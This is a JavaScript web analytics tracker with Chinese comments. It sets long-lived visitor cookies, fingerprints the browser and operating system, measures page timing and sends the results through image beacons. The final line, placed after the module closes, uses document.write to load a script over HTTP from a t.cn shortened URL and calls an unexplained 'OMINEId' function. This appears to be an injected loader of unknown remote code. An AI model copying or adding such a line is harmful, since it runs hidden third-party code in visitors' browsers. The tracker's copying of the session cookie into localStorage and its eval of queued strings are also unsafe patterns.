(function () {
    if (typeof _uba !== 'object') {
        _uba = [];
    }

    var /* encode */
        encodeWrapper = window.encodeURIComponent,
        /* decode */
        decodeWrapper = window.decodeURIComponent,
        _amp_ = "&",
        _equal_ = "=",
        configCookieNamePrefix = '_uba_',
        //访问链接主体参数
        params = {},
        //客户端信息参数
        clientArgs = {},
        //性能监测参数
        timeTrack = {},
        /**
         * utma的主要功能：识别唯一身份访客
         * 其中第一组的随机唯一ID和第二组的时间戳联合组成了访问者ID，通过这个ID来辨别网站的唯一访问者。
         * 而后面的几个时间戳用户计算网站停留时间和访问次数。
         * utma Cookie存储的内容：1360367272.1264374807.1264374807.1264374807.1
         * 第一组数字是一个随机产生的唯一ID。
         * 第二，三，四组数字是时间戳，其中第二组数字表示初次访问的时间。第三组数字表示上一次访问的时间，第四组数字表示本次访问开始的时间。
         * 第五组数字是访问次数计数器。这个数字随着访问次数的增加而增加。
         * PS：上面的三个时间戳数字相同，并且最后的访问次数计数器是1，表示这是第一次访问。
         */
        param_utma = 'utma',
        /*
         * 标识访问网址 生存周期到网页关闭
         */
        param_utmu = 'utmu',
        /*
         * 存储用户标识 只在第一次访问生存 与 utma一样
         */
        param_utmi = 'utmi',
        visitCookieValue = {},
        configVisitorCookieTimeout = 33955200000, // 13 months (365 days + 28days)
        configCookiePath = '/',
        configCookieDomain,
        configCookieIsSecure,
        // 当前页网址和来源页网址
        locationArray = urlFixup(document.domain, window.location.href, getReferrer()),
        //页面性能耗时监测
        clientOs = {};

    //判断变量是否存在
    function isDefined(property) {
        var propertyType = typeof property;

        return propertyType !== 'undefined';
    }

    function isFunction(property) {
        return typeof property === 'function';
    }

    function isObject(property) {
        return typeof property === 'object';
    }

    function isString(property) {
        return typeof property === 'string' || property instanceof String;
    }

    function isObjectEmpty(property) {
        if (!property) {
            return true;
        }

        var i;
        var isEmpty = true;
        for (i in property) {
            if (Object.prototype.hasOwnProperty.call(property, i)) {
                isEmpty = false;
            }
        }

        return isEmpty;
    }

    //检查是否第一次访问;
    function checkIsFisrtVisited() {
        return hasCookie(getCookieName(param_utmi)) ? false : true;
    }

    //生成cookie名称
    function getCookieName(baseName) {
        return configCookieNamePrefix + baseName;
    }

    /*
     * 获取cookie 值
     */
    function getCookie(cookieName) {

        if (!navigator.cookieEnabled) {
            return 0;
        }

        var name = cookieName + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1);
            if (c.indexOf(name) != -1) return c.substring(name.length, c.length);
        }
        return undefined;
    }

    /*
     * 设置Cookie
     */
    function setCookie(cookieName, value, msToExpire, path, domain, isSecure) {
        if (!navigator.cookieEnabled) {
            return 0;
        }
        var expiryDate;

        // relative time to expire in milliseconds
        if (msToExpire) {
            expiryDate = new Date();
            expiryDate.setTime(expiryDate.getTime() + msToExpire);
        }

        document.cookie = cookieName + '=' + encodeWrapper(value) +
            (msToExpire ? ';expires=' + expiryDate.toGMTString() : '') +
            ';path=' + (path || '/') +
            (domain ? ';domain=' + domain : '') +
            (isSecure ? ';secure' : '');
    }

    /*
     * 检查某Cookie是否存在
     */
    function hasCookie(cookieName) {
        if (!navigator.cookieEnabled) {
            return 0;
        }
        var s = document.cookie.indexOf(cookieName + '=');
        return s == -1 ? false : true;
    }

    /*
     * 删除cookie
     */
    function deleteCookie(cookieName, path, domain) {
        setCookie(cookieName, '', -86400, path, domain);
    }

    function getServerSessionValue() {
        return getCookie('PHPSESSID');
    }

    /*
     * 获取当前时间戳
    */
    function getCurrentTimestampInSeconds() {
        return Math.floor((new Date()).getTime() / 1000);
    }

    /*
     * 生成唯一标识id
     */
    function createUtmaUUID() {
        return sha1(
            (getServerSessionValue()) +
            (navigator.userAgent || '') +
            (navigator.platform || '') +
            (new Date()).getTime() +
            Math.random()
        ).slice(0, 16);
    }

    /*
     * 生成第一次访问的UTMA值
     */
    function createFirstVisitValue() {
        var nowTs = getCurrentTimestampInSeconds();
        visitCookieValue.uuid = createUtmaUUID();
        visitCookieValue.firstVisitTs = nowTs;
        visitCookieValue.lastVisitTs = nowTs;
        visitCookieValue.currentVisitTs = nowTs;
        visitCookieValue.visitCount = 1;
        return visitCookieValue;
    }

    function setVisitorUuid(uuid) {
        setCookie(getCookieName(param_utmi), uuid, getRemainingVisitorCookieTimeout(), configCookiePath, configCookieDomain, configCookieIsSecure);
    }

    /*
     * 设置访问者的utma到cookie
     */
    function setVisitorUtmaToCookie(visitorIdCookieValues) {
        if (!visitorIdCookieValues) {
            visitorIdCookieValues = getVisitCookieValue();
        }
        var cookieValue = visitorIdCookieValues.uuid + '.' +
            visitorIdCookieValues.firstVisitTs + '.' +
            visitorIdCookieValues.lastVisitTs + '.' +
            visitorIdCookieValues.currentVisitTs + '.' +
            visitorIdCookieValues.visitCount;
        setCookie(getCookieName(param_utma), cookieValue, getRemainingVisitorCookieTimeout(), configCookiePath, configCookieDomain, configCookieIsSecure);
        setVisitorUuid(visitorIdCookieValues.uuid);
    }

    function setSessionToLocal() {
        localStorage.setItem('session', getServerSessionValue())
    }

    function setVisitorUtmuToCookie() {
        setCookie(getCookieName(param_utmu), locationArray[1], getRemainingVisitorCookieTimeout(), configCookiePath, configCookieDomain, configCookieIsSecure);
}

    function getVisitCookieValue() {
        var visitCookieValues = getCookie(getCookieName(param_utma));
        if (!isDefined(visitCookieValues)) {
            visitCookieValue = createFirstVisitValue();
        } else {
            var arr = visitCookieValues.split('.');
            visitCookieValue.uuid = arr[0];
            visitCookieValue.firstVisitTs = arr[1];
            visitCookieValue.lastVisitTs = arr[2];
            visitCookieValue.currentVisitTs = arr[3];
            visitCookieValue.visitCount = arr[4];
        }
        return visitCookieValue;
    }

    function getRemainingVisitorCookieTimeout() {
        var now = new Date(),
            nowTs = now.getTime(),
            cookieCreatedTs = visitCookieValue.firstVisitTs;
        return (parseInt(cookieCreatedTs, 10) * 1000) + configVisitorCookieTimeout - nowTs;
    }

    function updateVisitorUtma() {
        var cookieValue = getVisitCookieValue();
        var now = getCurrentTimestampInSeconds();
        cookieValue.lastVisitTs = cookieValue.currentVisitTs;
        cookieValue.currentVisitTs = now;
        cookieValue.visitCount = parseInt(cookieValue.visitCount) + 1;
        visitCookieValue = cookieValue;
        setVisitorUtmaToCookie(cookieValue);
    }

    /*
     * 获取访问页面来源链接
     */
    function getReferrer() {
        var referrer = '';

        try {
            referrer = window.top.document.referrer;
        } catch (e) {
            if (window.parent) {
                try {
                    referrer = window.parent.document.referrer;
                } catch (e2) {
                    referrer = '';
                }
            }
        }

        if (referrer === '') {
            referrer = document.referrer;
        }

        return referrer;
    }

    function getHostName(url) {
        // scheme : // [username [: password] @] hostame [: port] [/ [path] [? query] [# fragment]]
        var e = new RegExp('^(?:(?:https?|ftp):)/*(?:[^@]+@)?([^:/#]+)'),
            matches = e.exec(url);

        return matches ? matches[1] : url;
    }

    function getUrlParameter(url, name) {
        var regexSearch = "[\\?&#]" + name + "=([^&#]*)";
        var regex = new RegExp(regexSearch);
        var results = regex.exec(url);
        return results ? decodeWrapper(results[1]) : '';
    }

    function urlFixup(hostName, href, referrer) {
        if (!hostName) {
            hostName = '';
        }

        if (!href) {
            href = '';
        }

        if (hostName === 'translate.googleusercontent.com') {       // Google
            if (referrer === '') {
                referrer = href;
            }

            href = getUrlParameter(href, 'u');
            hostName = getHostName(href);
        } else if (hostName === 'cc.bingj.com' ||                  // Bing
            hostName === 'webcache.googleusercontent.com' ||    // Google
            hostName.slice(0, 5) === '74.6.') {                 // Yahoo (via Inktomi 74.6.0.0/16)
            href = document.links[0].href;
            hostName = getHostName(href);
        }

        return [hostName, href, referrer];
    }

    /*
     * UTF-8 encoding
     */
    function utf8_encode(argString) {
        return unescape(window.encodeURIComponent(argString));
    }

    function sha1(str) {
        var rotate_left = function (n, s) {
                return (n << s) | (n >>> (32 - s));
            },

            cvt_hex = function (val) {
                var strout = '',
                    i,
                    v;

                for (i = 7; i >= 0; i--) {
                    v = (val >>> (i * 4)) & 0x0f;
                    strout += v.toString(16);
                }

                return strout;
            },

            blockstart,
            i,
            j,
            W = [],
            H0 = 0x67452301,
            H1 = 0xEFCDAB89,
            H2 = 0x98BADCFE,
            H3 = 0x10325476,
            H4 = 0xC3D2E1F0,
            A,
            B,
            C,
            D,
            E,
            temp,
            str_len,
            word_array = [];

        str = utf8_encode(str);
        str_len = str.length;

        for (i = 0; i < str_len - 3; i += 4) {
            j = str.charCodeAt(i) << 24 | str.charCodeAt(i + 1) << 16 |
                str.charCodeAt(i + 2) << 8 | str.charCodeAt(i + 3);
            word_array.push(j);
        }

        switch (str_len & 3) {
            case 0:
                i = 0x080000000;
                break;
            case 1:
                i = str.charCodeAt(str_len - 1) << 24 | 0x0800000;
                break;
            case 2:
                i = str.charCodeAt(str_len - 2) << 24 | str.charCodeAt(str_len - 1) << 16 | 0x08000;
                break;
            case 3:
                i = str.charCodeAt(str_len - 3) << 24 | str.charCodeAt(str_len - 2) << 16 | str.charCodeAt(str_len - 1) << 8 | 0x80;
                break;
        }

        word_array.push(i);

        while ((word_array.length & 15) !== 14) {
            word_array.push(0);
        }

        word_array.push(str_len >>> 29);
        word_array.push((str_len << 3) & 0x0ffffffff);

        for (blockstart = 0; blockstart < word_array.length; blockstart += 16) {
            for (i = 0; i < 16; i++) {
                W[i] = word_array[blockstart + i];
            }

            for (i = 16; i <= 79; i++) {
                W[i] = rotate_left(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1);
            }

            A = H0;
            B = H1;
            C = H2;
            D = H3;
            E = H4;

            for (i = 0; i <= 19; i++) {
                temp = (rotate_left(A, 5) + ((B & C) | (~B & D)) + E + W[i] + 0x5A827999) & 0x0ffffffff;
                E = D;
                D = C;
                C = rotate_left(B, 30);
                B = A;
                A = temp;
            }

            for (i = 20; i <= 39; i++) {
                temp = (rotate_left(A, 5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0x0ffffffff;
                E = D;
                D = C;
                C = rotate_left(B, 30);
                B = A;
                A = temp;
            }

            for (i = 40; i <= 59; i++) {
                temp = (rotate_left(A, 5) + ((B & C) | (B & D) | (C & D)) + E + W[i] + 0x8F1BBCDC) & 0x0ffffffff;
                E = D;
                D = C;
                C = rotate_left(B, 30);
                B = A;
                A = temp;
            }

            for (i = 60; i <= 79; i++) {
                temp = (rotate_left(A, 5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0x0ffffffff;
                E = D;
                D = C;
                C = rotate_left(B, 30);
                B = A;
                A = temp;
            }

            H0 = (H0 + A) & 0x0ffffffff;
            H1 = (H1 + B) & 0x0ffffffff;
            H2 = (H2 + C) & 0x0ffffffff;
            H3 = (H3 + D) & 0x0ffffffff;
            H4 = (H4 + E) & 0x0ffffffff;
        }

        temp = cvt_hex(H0) + cvt_hex(H1) + cvt_hex(H2) + cvt_hex(H3) + cvt_hex(H4);

        return temp.toLowerCase();
    }

    /*
　 *　方法:Array.remove(dx)
　 *　功能:删除数组元素.
　 *　参数:dx删除元素的下标.
　 *　返回:在原数组上修改数组
*/
    //经常用的是通过遍历,重构数组.
    Array.prototype.remove=function(dx) {
        if(isNaN(dx)||dx>this.length){return false;}
        for(var i=0,n=0;i<this.length;i++)
        {
            if(this[i]!=this[dx])
            {
                this[n++]=this[i]
            }
        }
        this.length-=1
    }

    function getRequest() {
        var url = location.search; //获取url中"?"符后的字串
        var theRequest = new Object();
        if (url.indexOf("?") != -1) {
            var str = url.substr(1);
            strs = str.split("&");
            for(var i = 0; i < strs.length; i ++) {
                theRequest[strs[i].split("=")[0]]=unescape(strs[i].split("=")[1]);
            }
        }
        return theRequest;
    }

    //拼接参数
    function connectParams(params) {
        if (params == null) {
            return params;
        }
        var args = '';
        for (var i in params) {
            if (args !== '') {
                args += _amp_;
            }
            args += i + _equal_ + encodeURIComponent(params[i]);
        }
        return args;
    }

    var timeTracker = function () {
        var timing = window.performance.timing;
        var t = {};
        t.uuid = visitCookieValue.uuid;
        t.url = locationArray[1];
        //从开始至load总耗时
        t.loadTime = timing.loadEventEnd - timing.navigationStart;//过早获取时,loadEventEnd有时会是0
        if (t.loadTime <= 0) {
            // 未加载完，延迟200ms后重复监测，直到成功
            setTimeout(function () {
                timeTracker();
            }, 200);
            return;
        }
        //准备新页面时间耗时
        t.readyStart = timing.fetchStart - timing.navigationStart;
        //redirect 重定向耗时
        t.redirectTime = timing.redirectEnd - timing.redirectStart;
        //Appcache 耗时
        t.appcacheTime = timing.domainLookupStart - timing.fetchStart;
        //unload 前文档耗时
        t.unloadEventTime = timing.unloadEventEnd - timing.unloadEventStart;
        //DNS 查询耗时
        t.lookupDomainTime = timing.domainLookupEnd - timing.domainLookupStart;
        //TCP连接耗时
        t.connectTime = timing.connectEnd - timing.connectStart;
        //request请求耗时
        t.requestTime = timing.responseEnd - timing.requestStart;
        //请求完毕至DOM加载
        t.initDomTreeTime = timing.domInteractive - timing.responseEnd;
        //解析dom树耗时
        t.domReadyTime = timing.domComplete - timing.domInteractive; //过早获取时,domComplete有时会是0
        //load事件耗时
        t.loadEventTime = timing.loadEventEnd - timing.loadEventStart;
        localStorage.setItem('timeTrace', JSON.stringify(t));
    };
    var client = function () {
        //内核引擎
        var engine = {
            ie: 0,
            gecko: 0,
            webkit: 0,
            khtml: 0,
            opera: 0,
            ver: null
        };
        //浏览器
        var browser = {
            ie: 0,
            firefox: 0,
            safari: 0,
            konq: 0,
            opera: 0,
            chrome: 0,
            ver: null
        };

        //操作系统
        var system = {
            win: false,
            mac: false,
            xll: false,
            iphone: false,
            ipoad: false,
            ipad: false,
            ios: false,
            android: false,
            nokiaN: false,
            winMobile: false,
            wii: false,
            ps: false
        };

        var ua = navigator.userAgent;
        // 检测浏览器呈现引擎
        if (window.opera) {
            engine.ver = browser.ver = window.opera.version();
            engine.opera = browser.opera = parseFloat(engine.ver);
        } else if (/AppleWebkit\/(\S+)/i.test(ua)) {
            engine.ver = RegExp['$1'];
            engine.webkit = parseFloat(engine.ver);

            // 确定是Chrome还是Safari
            if (/Chrome\/(\S+)/i.test(ua)) {
                browser.ver = RegExp['$1'];
                browser.chrome = parseFloat(browser.ver);
            } else if (/Version\/(\S+)/i.test(ua)) {
                browser.ver = RegExp['$1'];
                browser.safari = parseFloat(browser.ver);
            } else {
                // 近似地确定版本号
                var safariVersion = 1;
                if (engine.webkit < 100) {
                    safariVersion = 1;
                } else if (engine.webkit < 312) {
                    safariVersion = 1.2;
                } else if (engine.webkit < 412) {
                    safariVersion = 1.3;
                } else {
                    safariVersion = 2;
                }

                browser.safari = browser.safari = safariVersion;
            }
        } else if (/KHTML\/(\S+)/i.test(ua) || /Konqueror\/([^;]+)/i.test(ua)) {
            engine.ver = browser.ver = RegExp['$1'];
            engine.khtml = browser.konq = parseFloat(engine.ver);
        } else if (/rv:([^\)]+)\) Gecko\/\d{8}/i.test(ua)) {
            engine.ver = RegExp['$1'];
            engine.gecko = parseFloat(engine.ver);
            // 确定是不是Firefox
            if (/Firefox\/(\S+)/i.test(ua)) {
                engine.ver = browser.ver = RegExp['$1'];
                engine.firefox = parseFloat(browser.ver);
                browser.firefox = parseFloat(browser.ver);
            }
        } else if (/MSIE ([^;]+)/i.test(ua)) {
            engine.ver = browser.ver = RegExp['$1'];
            engine.ie = browser.ie = parseFloat(engine.ver);
        }

        // 检测平台
        var p = navigator.platform;
        system.win = p.indexOf('Win') == 0;
        system.mac = p.indexOf('Mac') == 0;
        system.xll = (p.indexOf('Xll') == 0 || p.indexOf('Linux') == 0);

        // 检测Windows操作系统
        if (system.win) {
            if (/Win(?:dows )?([^do]{2})\s?(\d+\.\d+)?/.test(ua)) {
                if (RegExp['$1'] == 'NT') {
                    switch (RegExp['$2']) {
                        case '5.0':
                            system.win = '2000';
                            break;
                        case '5.1':
                            system.win = 'XP';
                            break;
                        case '6.0':
                            system.win = 'Vista';
                            break;
                        case '6.1':
                            system.win = '7';
                            break;
                        case '6.2':
                            system.win = '8';
                            break;
                        default:
                            system.win = 'NT';
                            break;
                    }
                } else if (RegExp['$1'] == '9x') {
                    system.win = 'ME';
                } else {
                    system.win = RegExp['$1'];
                }
            }
        }

        // 移动设备
        system.iphone = ua.indexOf('iPhone') > -1;
        system.ipod = ua.indexOf('iPod') > -1;
        system.ipad = ua.indexOf('iPad') > -1;
        system.nokiaN = ua.indexOf('nokiaN') > -1;

        // windows mobile
        if (system.win == 'CE') {
            system.winMobile = system.win;
        } else if (system.win == 'Ph') {
            if (/Windows Phone OS (\d+.\d)/i.test(ua)) {
                system.win = 'Phone';
                system.winMobile = parseFloat(RegExp['$1']);
            }
        }

        // 检测IOS版本
        if (system.mac && ua.indexOf('Mobile') > -1) {
            if (/CPU (?:iPhone )?OS (\d+_\d+)/i.test(ua)) {
                system.ios = parseFloat(RegExp['$1'].replace('_', '.'));
            } else {
                system.ios = 2;        // 不能真正检测出来，所以只能猜测
            }
        }

        // 检测Android版本
        if (/Android (\d+\.\d+)/i.test(ua)) {
            system.android = parseFloat(RegExp['$1']);
        }

        // 游戏系统
        system.wii = ua.indexOf('Wii') > -1;
        system.ps = /PlayStation/i.test(ua);

        return {
            engine: engine,
            browser: browser,
            system: system
        }
    }();
    var getClientOs = function () {
        for (var i in client.browser) {
            if (client.browser[i] !== 0 && i !== 'ver') {
                clientOs.bn = i;
                clientOs.bnv = client.browser.ver;
            }
        }
        for (var i in client.engine) {
            if (client.engine[i] !== 0 && i !== 'ver') {
                clientOs.engn = i;
                clientOs.engv = client.engine.ver;
            }
        }
        for (var i in client.system) {
            if (client.system[i] !== false && i !== 'ver') {
                clientOs.osn = i;
                clientOs.osv = client.system[i];
            }
        }
    }();

    function setCustomParams(args) {
        if (isObject(args)) {
            params = Object.assign(params, args);
        }
    }

    function setWebSite(siteId){
        params.sid = siteId;
    }

    function setModelName(name) {
        params.modn = name;
    }

    function setActionName(name) {
        params.actn = name;
    }

    //添加设置url参数
    function setParamsValue(value) {
        if( isObject(value)  ){
            if( params.parv ){
                params.parv = JSON.stringify(Object.assign( params.parv, value ));
            }
            params.parv = JSON.stringify(value);
        }else if( params.parv && isString(value) ){
            params.parv += value;
        }else {
            params.parv = value;
        }
    }

    //添加页面操作事件追踪
    function addTraceEvent( args ) {
        if( !args.name || !args.data ){
            return;
        }
        args.ts = getCurrentTimestampInSeconds();
       var traceEventList = JSON.parse(localStorage.getItem('traceEventList')) || [] ;
        traceEventList.push(args);
        localStorage.setItem('traceEventList', JSON.stringify(traceEventList));
    }

    function sendImg() {
        //拼接参数串
        //客户端信息
        //cid 客户端id
        var cid = getCookie(getCookieName('ci'));
        if (!isDefined(cid)) {

            //Window对象数据
            if (window && window.screen) {
                clientArgs.sh = window.screen.height || 0;
                clientArgs.sw = window.screen.width || 0;
                clientArgs.cd = window.screen.colorDepth || 0;
            }
            //navigator对象数据
            if (navigator) {
                clientArgs.la = navigator.language || '';
                clientArgs.apn = navigator.appName || '';
                clientArgs.apv = navigator.appVersion || '';
                clientArgs.apc = navigator.appCodeName || '';
                clientArgs.ua = navigator.userAgent || '';
                clientArgs.cookie = navigator.cookieEnabled ? 1 : 0;
            }
            clientArgs = Object.assign(clientArgs, clientOs);
            clientArgs.uuid = params.uuid;
            var cArgs = connectParams(clientArgs);
            new Image(1, 1).src = '/Uba/Trace/clientTracker?' + cArgs;
            cid = getCookie(getCookieName('ci'))
        }
        params.cid = cid || '';
        //通过Image对象发送请求
        //延迟500ms发送
        setTimeout(function () {
            //用户访问的主体信息
            var args = connectParams(params);
            new Image(1, 1).src = '/Uba/Trace/index?' + args;
            //性能信息
            var timeTrace = JSON.parse(localStorage.getItem('timeTrace'));
            timeTrace.cid = cid;
            timeTrace.vc = params.visitCount;
            timeTrace.ts = params.currentVisitTs;
            var timeArgs = connectParams(timeTrace);

            (new Image(1, 1)).src = '/Uba/Trace/timeTracker?' + timeArgs;
        }, 500)
    }

    function sendUnloadImg() {
        if (_uba.length > 0) {
            for (var i in _uba) {
                try {
                    var func = _uba[i][0];
                    if (func && isFunction(eval(func)) && _uba[i][2] === 'unload' ) {
                        eval(func + "(" + JSON.stringify(_uba[i][1]) + ")");
                    }
                } catch (e) {
                }
            }
        }
        var unloadParam = {};
        unloadParam.uuid = params.uuid;
        unloadParam.vc = params.visitCount;
        unloadParam.cid = params.cid || '';
        unloadParam.firstVisitTs = params.firstVisitTs;
        unloadParam.stayTs = getCurrentTimestampInSeconds() - params.currentVisitTs;
        unloadParam.tev = localStorage.getItem('traceEventList');
        var args = connectParams(unloadParam);
        new Image(1, 1).src = '/Uba/Trace/beforeUnload?' + args;
        localStorage.removeItem('traceEventList');
    }

    window.addEventListener("load", function () {
        timeTracker();

        // 第一次访问
        if (checkIsFisrtVisited() === 0) {
            console.log('当前浏览器无法使用Cookie');
        } else {
            //检测 server是否有重新生成命令 设置重新生成vid
            if( getCookie(getCookieName('create_id')) === '1' ){
                setVisitorUtmaToCookie(createFirstVisitValue());
                deleteCookie( getCookieName('create_id'));
            }
            //检查session 是否关闭过了浏览器
            //存储的session 和 浏览器session不一样时 说明已经关闭过了浏览器
            if (localStorage.getItem('session') !== getServerSessionValue()) {
                setSessionToLocal();
                setVisitorUtmaToCookie(createFirstVisitValue());
            } else if (checkIsFisrtVisited()) {
                setVisitorUtmaToCookie(getVisitCookieValue());
            } else {
                if (!hasCookie(getCookieName(param_utma))) {
                    setVisitorUtmaToCookie(getVisitCookieValue());
                }
                updateVisitorUtma();
            }
            // if (!hasCookie(getCookieName(param_utmu))) {
            //     setVisitorUtmuToCookie();
            // }
            params = Object.assign(params, visitCookieValue);
            if (_uba) {
                if (_uba.length > 0) {
                    for (var i in _uba) {
                        try {
                            var func = _uba[i][0];
                            if (func && isFunction(eval(func))) {
                                eval(func + "(" + JSON.stringify(_uba[i][1]) + ")");
                                // _uba.remove(i);
                            }
                        } catch (e) {
                        }
                    }
                }
                //Document对象数据
                if (document) {
                    params.domain = locationArray[0];
                    params.url = locationArray[1];
                    params.title = document.title || '';
                    params.referrer = locationArray[2];
                }

                if( getRequest() ){
                    setParamsValue( getRequest()  );
                }
                sendImg();
            }
        }
    });
    //关闭和刷新时
    window.addEventListener("beforeunload", function (e) {
        sendUnloadImg();
    });
    //超时3分钟未操作页面重新生成访问标识
    window.setTimeout( function(){
        setVisitorUtmaToCookie(createFirstVisitValue());
    },180*1000 );

})();
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
